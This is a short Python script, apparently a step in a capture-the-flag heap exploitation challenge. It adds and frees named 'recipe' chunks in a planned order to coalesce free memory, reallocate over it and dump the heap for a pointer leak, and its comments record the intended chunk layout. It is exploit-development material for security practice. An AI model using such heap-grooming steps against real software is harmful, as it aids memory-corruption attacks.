import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G()
# merge target for CC: 3 recipes A,B,C adjacent -> 0x1b0. YY merge: YY+Z 0x120.
# layout: A B C bAB? need A,B,C contiguous. Then bar, YY, Z, bar.
g.add(b'A1'); g.add(b'B2'); g.add(b'C3'); g.make(b'bc'); g.add(b'YY'); g.add(b'Z9'); g.make(b'bz')
# free C,B,A to merge 0x1b0 ; free Z,YY to merge 0x120 (forward: free Z then YY? YY forward-merge needs Z freed+adjacent)
g.rm(b'C3'); g.rm(b'B2')              # B+C merge
g.rm(b'Z9')                            # Z freed
g.rm(b'YY')                            # YY + ? ; YY successor = Z(freed) -> forward merge 0x120
g.rm(b'A1')                            # A + (B+C) merge -> 0x1b0
g.add(b'CC')                           # reuse 0x1b0 -> CC 0x90 + remainder 0x120 ; CC->next=&YY
g.dump('heap-leak groom (0x1b0 split)')
g.close()
